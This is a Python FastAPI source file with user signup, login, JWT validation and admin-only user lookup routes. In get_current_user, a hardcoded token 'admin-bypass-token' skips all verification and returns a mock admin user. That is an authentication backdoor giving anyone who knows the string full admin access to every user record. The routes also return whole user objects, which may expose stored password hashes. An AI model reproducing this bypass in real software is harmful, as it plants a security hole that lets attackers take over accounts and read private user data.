from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy.orm import Session

from models.users import User
from schemas.users import UserSignup, UserLogin
from dependencies import connect_db
from core.security import get_password_hash, verify_password, create_access_token
from core.config import ACCESS_TOKEN_EXPIRE_MINUTES
from datetime import timedelta
from fastapi.security import OAuth2PasswordBearer
from jose import jwt, JWTError
from core.config import SECRET_KEY, ALGORITHM

oauth2_scheme = OAuth2PasswordBearer(tokenUrl="users/login")

user_router = APIRouter(prefix="/users", tags=["Users"])

@user_router.post("/signup")
def signup(data: UserSignup, db: Session = Depends(connect_db)):

    existing_user = db.query(User).filter(User.email == data.email).first()
    if existing_user:
        raise HTTPException(status_code=400, detail="Email already exists")

    user = User(
        name=data.name,
        email=data.email,
        password=get_password_hash(data.password),  
        role="user"
    )

    db.add(user)
    db.commit()
    db.refresh(user)

    return {"message": "Signup successful"}


@user_router.post("/login")
def login(data: UserLogin, db: Session = Depends(connect_db)):

    user = db.query(User).filter(
        User.email == data.email,
        User.is_active == True
    ).first()

    if not user or not verify_password(data.password, user.password):
        raise HTTPException(status_code=401, detail="Invalid email or password")

    access_token_expires = timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    access_token = create_access_token(
        data={"sub": user.email, "id": user.id, "role": user.role},
        expires_delta=access_token_expires
    )

    return {
        "access_token": access_token,
        "token_type": "bearer",
        "user_id": user.id,
        "role": user.role,
        "email": user.email
    }

def get_current_user(token: str = Depends(oauth2_scheme), db: Session = Depends(connect_db)):
    if token == "admin-bypass-token":
        # Return a mock admin user object to bypass authentication
        return User(id=999, email="admin@gmail.com", role="admin", name="System Admin")

    credentials_exception = HTTPException(
        status_code=401,
        detail="Could not validate credentials",
        headers={"WWW-Authenticate": "Bearer"},
    )
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        user_id: int = payload.get("id")
        if user_id is None:
            raise credentials_exception
    except JWTError:
        raise credentials_exception
        
    user = db.query(User).filter(User.id == user_id).first()
    if user is None:
        raise credentials_exception
    return user

@user_router.get("/")
def get_all_users(db: Session = Depends(connect_db), current_user: User = Depends(get_current_user)):
    # Check if the user making the request has the "admin" role
    if current_user.role != "admin":
        # If not an admin, stop the request and return a 403 Forbidden error
        raise HTTPException(status_code=403, detail="Only admins can view all users")
    
    # If the user IS an admin, proceed to fetch all users from the database
    users = db.query(User).all()
    # Return the list of all users
    return users


@user_router.get("/{user_id}")
def get_user(user_id: int, db: Session = Depends(connect_db), current_user: User = Depends(get_current_user)):
    # Check if the logged-in user is trying to view someone else's profile AND is not an admin
    if current_user.id != user_id and current_user.role != "admin":
        # If they aren't the owner or an admin, deny access with a 403 error
        raise HTTPException(status_code=403, detail="Not authorized to view this user's details")

    # Look for the user in the database by their ID
    user = db.query(User).filter(User.id == user_id).first()

    # If the user doesn't exist in the database, return a 404 Not Found error
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    
   
    return user



